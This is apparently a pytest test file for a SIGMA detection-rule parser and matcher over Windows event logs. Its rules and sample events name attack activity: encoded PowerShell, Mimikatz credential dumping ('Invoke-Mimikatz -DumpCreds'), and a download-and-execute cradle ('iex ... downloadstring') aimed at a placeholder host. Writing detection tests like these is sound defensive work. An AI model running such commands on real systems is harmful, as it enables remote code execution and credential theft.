# test_sigma_parser.py
# --------------------
# Sprint 8 — SIGMA rule import. Phase 1 covers the parser + runtime
# matcher in pulse/core/sigma.py.
#
# The parser turns community SIGMA YAML into a JSON spec the runtime
# can evaluate against parsed Windows event dicts. v1 supports the
# pragmatic subset: selection blocks, equality + |contains/startswith/
# endswith/re modifiers, `and`/`or`/`not` conditions. Aggregations
# (`| count() by user`) and `1 of`/`all of` raise SigmaUnsupported.

import json

import pytest

from pulse.core.sigma import (
    SigmaParseError,
    SigmaUnsupported,
    parse_sigma,
    matches,
)


# ---------------------------------------------------------------------------
# Test helpers — build event dicts shaped like parse_evtx output
# ---------------------------------------------------------------------------

_NS = "http://schemas.microsoft.com/win/2004/08/events/event"


def _event(event_id, **fields):
    """Build an event dict with the given EventData fields baked into the
    XML payload (the same shape parse_evtx returns)."""
    data = "".join(
        f'<Data Name="{k}">{v}</Data>' for k, v in fields.items() if v is not None
    )
    xml = (
        f'<Event xmlns="{_NS}">'
        f'<System><EventID>{event_id}</EventID></System>'
        f'<EventData>{data}</EventData>'
        f'</Event>'
    )
    return {
        "event_id":   event_id,
        "timestamp":  "2026-05-28T09:00:00.000Z",
        "data":       xml,
        "record_num": 1,
        "computer":   "TEST-PC",
    }


# ---------------------------------------------------------------------------
# Happy path — typical community SIGMA rule
# ---------------------------------------------------------------------------

_POWERSHELL_YAML = """
title: Suspicious PowerShell Encoded Command
description: Detects encoded PowerShell commands often used by malware
references:
  - https://attack.mitre.org/techniques/T1059/001/
tags:
  - attack.execution
  - attack.t1059.001
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    EventID: 4688
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc '
  condition: selection
level: high
"""


def test_parse_typical_community_rule():
    rule = parse_sigma(_POWERSHELL_YAML)
    assert rule.title == "Suspicious PowerShell Encoded Command"
    assert rule.severity == "HIGH"
    assert rule.mitre == "T1059.001"
    assert "encoded" in rule.description.lower()
    assert "selection" in rule.compiled["selections"]
    assert rule.compiled["condition"] == {"op": "ref", "name": "selection"}


def test_parsed_rule_round_trips_to_json():
    rule = parse_sigma(_POWERSHELL_YAML)
    serialized = rule.to_json()
    parsed_back = json.loads(serialized)
    assert parsed_back["title"] == rule.title
    assert parsed_back["severity"] == "HIGH"


# ---------------------------------------------------------------------------
# Severity mapping
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("level,expected", [
    ("critical", "CRITICAL"),
    ("high", "HIGH"),
    ("medium", "MEDIUM"),
    ("low", "LOW"),
    ("informational", "LOW"),
    ("info", "LOW"),
])
def test_severity_mapping(level, expected):
    yaml = f"""
title: x
detection:
  selection:
    EventID: 1
  condition: selection
level: {level}
"""
    rule = parse_sigma(yaml)
    assert rule.severity == expected


def test_unknown_severity_rejected():
    yaml = """
title: x
detection:
  selection:
    EventID: 1
  condition: selection
level: cosmic
"""
    with pytest.raises(SigmaParseError, match="level"):
        parse_sigma(yaml)


# ---------------------------------------------------------------------------
# MITRE technique extraction
# ---------------------------------------------------------------------------

def test_mitre_extracted_from_tags():
    yaml = """
title: x
tags:
  - attack.lateral_movement
  - attack.t1021.001
detection:
  selection: { EventID: 4624 }
  condition: selection
level: high
"""
    rule = parse_sigma(yaml)
    assert rule.mitre == "T1021.001"


def test_mitre_missing_when_no_technique_tag():
    yaml = """
title: x
tags: [attack.execution]
detection:
  selection: { EventID: 4688 }
  condition: selection
level: high
"""
    rule = parse_sigma(yaml)
    assert rule.mitre is None


# ---------------------------------------------------------------------------
# Required fields + error paths
# ---------------------------------------------------------------------------

def test_empty_yaml_rejected():
    with pytest.raises(SigmaParseError):
        parse_sigma("")


def test_non_yaml_rejected():
    with pytest.raises(SigmaParseError):
        parse_sigma("this is not: valid: yaml: nesting:")


def test_missing_title_rejected():
    yaml = """
detection:
  selection: { EventID: 1 }
  condition: selection
level: high
"""
    with pytest.raises(SigmaParseError, match="title"):
        parse_sigma(yaml)


def test_missing_detection_rejected():
    with pytest.raises(SigmaParseError, match="detection"):
        parse_sigma("title: x\nlevel: high\n")


def test_missing_condition_rejected():
    yaml = """
title: x
detection:
  selection: { EventID: 1 }
level: high
"""
    with pytest.raises(SigmaParseError, match="condition"):
        parse_sigma(yaml)


def test_unsupported_aggregation_rejected():
    yaml = """
title: x
detection:
  selection: { EventID: 4625 }
  condition: selection | count() by user > 5
level: high
"""
    with pytest.raises(SigmaUnsupported, match="aggregation"):
        parse_sigma(yaml)


def test_unsupported_1_of_them_rejected():
    yaml = """
title: x
detection:
  selection1: { EventID: 1 }
  selection2: { EventID: 2 }
  condition: 1 of them
level: high
"""
    with pytest.raises(SigmaUnsupported):
        parse_sigma(yaml)


def test_invalid_regex_rejected_at_parse_time():
    """A bad regex in the YAML should fail at import, not at scan time
    when it would silently match nothing."""
    yaml = """
title: x
detection:
  selection:
    CommandLine|re: '['
  condition: selection
level: high
"""
    with pytest.raises(SigmaParseError, match="regex"):
        parse_sigma(yaml)


# ---------------------------------------------------------------------------
# Condition language: and / or / not / parens
# ---------------------------------------------------------------------------

def test_condition_and():
    yaml = """
title: x
detection:
  s1: { EventID: 4688 }
  s2: { CommandLine|contains: powershell }
  condition: s1 and s2
level: high
"""
    rule = parse_sigma(yaml)
    cond = rule.compiled["condition"]
    assert cond["op"] == "and"
    assert {c["name"] for c in cond["args"]} == {"s1", "s2"}


def test_condition_or_with_not():
    yaml = """
title: x
detection:
  s1: { EventID: 4624 }
  s2: { EventID: 4625 }
  s3: { TargetUserName: SYSTEM }
  condition: (s1 or s2) and not s3
level: high
"""
    rule = parse_sigma(yaml)
    assert rule.compiled["condition"]["op"] == "and"


def test_condition_unknown_name_rejected():
    yaml = """
title: x
detection:
  selection: { EventID: 1 }
  condition: typo_name
level: high
"""
    with pytest.raises(SigmaParseError, match="unknown selection"):
        parse_sigma(yaml)


# ---------------------------------------------------------------------------
# Runtime matcher
# ---------------------------------------------------------------------------

def test_matches_simple_event_id():
    rule = parse_sigma(_POWERSHELL_YAML)
    matching = _event(4688, CommandLine="powershell -EncodedCommand SGVsbG8=")
    non_matching_id = _event(4624, CommandLine="powershell -EncodedCommand SGVsbG8=")
    non_matching_cmd = _event(4688, CommandLine="powershell hello")
    assert matches(rule.compiled, matching) is True
    assert matches(rule.compiled, non_matching_id) is False
    assert matches(rule.compiled, non_matching_cmd) is False


def test_matches_contains_case_insensitive():
    yaml = """
title: x
detection:
  selection:
    CommandLine|contains: Mimikatz
  condition: selection
level: critical
"""
    rule = parse_sigma(yaml)
    assert matches(rule.compiled, _event(4688, CommandLine="C:\\tools\\MIMIKATZ.exe -h")) is True
    assert matches(rule.compiled, _event(4688, CommandLine="notepad.exe")) is False


def test_matches_startswith_endswith():
    yaml = """
title: x
detection:
  s_start: { ProcessName|startswith: 'C:\\Windows\\Temp\\' }
  s_end:   { ProcessName|endswith: '.exe' }
  condition: s_start and s_end
level: high
"""
    rule = parse_sigma(yaml)
    assert matches(rule.compiled, _event(1, ProcessName="C:\\Windows\\Temp\\mimi.exe")) is True
    assert matches(rule.compiled, _event(1, ProcessName="C:\\Program Files\\Foo\\mimi.exe")) is False


def test_matches_regex():
    yaml = """
title: x
detection:
  selection:
    CommandLine|re: '(?i)Invoke-(Mimikatz|Expression)'
  condition: selection
level: high
"""
    rule = parse_sigma(yaml)
    assert matches(rule.compiled, _event(1, CommandLine="iex (new-object net.webclient).downloadstring('http://x')")) is False
    assert matches(rule.compiled, _event(1, CommandLine="Invoke-Mimikatz -DumpCreds")) is True


def test_matches_or_over_value_list():
    """Default (no |all modifier) — values list is OR'd."""
    yaml = """
title: x
detection:
  selection:
    EventID:
      - 4624
      - 4625
      - 4634
  condition: selection
level: medium
"""
    rule = parse_sigma(yaml)
    assert matches(rule.compiled, _event(4624)) is True
    assert matches(rule.compiled, _event(4625)) is True
    assert matches(rule.compiled, _event(4634)) is True
    assert matches(rule.compiled, _event(4720)) is False


def test_matches_handles_and_or_not_condition():
    yaml = """
title: x
detection:
  failed:  { EventID: 4625 }
  succeeded: { EventID: 4624 }
  system:   { TargetUserName: SYSTEM }
  condition: (failed or succeeded) and not system
level: medium
"""
    rule = parse_sigma(yaml)
    assert matches(rule.compiled, _event(4624, TargetUserName="alice")) is True
    assert matches(rule.compiled, _event(4625, TargetUserName="alice")) is True
    assert matches(rule.compiled, _event(4624, TargetUserName="SYSTEM")) is False
    assert matches(rule.compiled, _event(4720, TargetUserName="alice")) is False


def test_matches_missing_field_does_not_crash():
    """If the event doesn't carry the field the rule asks about, the
    selection just doesn't match — never raises."""
    yaml = """
title: x
detection:
  selection:
    CommandLine|contains: foo
  condition: selection
level: medium
"""
    rule = parse_sigma(yaml)
    # No CommandLine in this event at all.
    assert matches(rule.compiled, _event(4624, TargetUserName="alice")) is False


def test_matches_corrupt_xml_returns_false():
    """Garbage XML in event['data'] should not crash the matcher."""
    yaml = """
title: x
detection:
  selection: { CommandLine|contains: x }
  condition: selection
level: medium
"""
    rule = parse_sigma(yaml)
    bad_event = {
        "event_id": 4688,
        "timestamp": "2026-05-28T09:00:00.000Z",
        "data": "<Event><not closed>",
        "record_num": 1,
        "computer": "TEST",
    }
    assert matches(rule.compiled, bad_event) is False
